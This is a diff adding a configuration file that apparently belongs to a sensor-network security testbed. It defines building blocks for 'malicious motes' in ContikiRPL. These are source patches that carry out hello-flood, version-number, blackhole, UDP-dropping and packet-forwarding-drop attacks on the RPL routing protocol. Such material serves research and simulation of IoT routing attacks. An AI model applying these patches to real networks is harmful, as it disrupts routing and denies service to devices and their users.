@@ -1,0 +1,55 @@
+/*
+
+Building blocks consist of either ContikiRPL configuration constants or single-line based source code modifications,
+ e.g. :
+
+ "...": {
+   "RPL_CONF_DIO_INTERVAL_MIN": 1
+ }
+
+ will set the configuration constant RPL_CONF_DIO_INTERVAL_MIN to 1 at the beginning of the malicious mote's code
+
+ while
+
+ "...": {
+   "rpl-icmp6.c": ["dag->version;", "dag->version++;"]
+ }
+
+ will modify rpl-icmp6.c from the ContikiRPL library at line where "dag->version;" appears to "dag->version++;"
+
+ */
+
+{
+  "hello-flood": {
+    "RPL_CONF_DIS_INTERVAL": 0,
+    "RPL_CONF_DIS_START_DELAY": 0,
+    "rpl/rpl-timers.c": ["next_dis++;", "next_dis++; int i=0; while (i<20) {i++; dis_output(NULL);} PRINTF(\"HELLO FLOOD CODE CALLED\");"]
+  },
+  "version-number": {
+    "rpl/rpl-icmp6.c": ["dag->version;", "dag->version++; PRINTF(\"VERSION NUMBER CODE CALLED\");"]
+  },
+  "blackhole": {
+    "RPL_CONF_MIN_HOPRANKINC": 0,
+    "rpl/rpl-private.h": [
+      ["#define RPL_MAX_RANKINC             (7 * RPL_MIN_HOPRANKINC)", "#define RPL_MAX_RANKINC 0"],
+      ["#define INFINITE_RANK                   0xffff", "#define INFINITE_RANK 256"]
+    ],
+    "rpl/rpl-timers.c": [
+      ["rpl_recalculate_ranks();", null]
+    ],
+    "rpl/rpl-icmp6.c" : [
+      ["set16(buffer, pos, dag->rank);", "set16(buffer, pos, 128); PRINTF(\"BLACKHOLE CODE CALLED\");"] /* RootRank = 128, MinHopRank = 256 */
+    ]
+  },
+  "drop-upd": {
+    "ip/uip-udp-packet.c" : ["if(toaddr != NULL) {", "if(0) {"]
+  },
+  "dont-forward-uip6" : {
+    "ipv6/uip6.c" : [
+      ["      goto send;  // send packet to next node",
+      "printf(\"dont forward uip6: not forwarding packet from \"); uip_debug_ipaddr_print(&UIP_IP_BUF->srcipaddr); printf(\" to \"); uip_debug_ipaddr_print(&UIP_IP_BUF->destipaddr); printf(\"\\n\"); goto drop;"]
+    /* problem is, there are several goto send; statements. Thats why we add the comment at the end! */,
+      ["UIP_STAT(++uip_stat.ip.forwarded);  // send packet to next node", "UIP_STAT(++uip_stat.ip.drop);  // send packet to next node"]
+    ]
+  }
+}
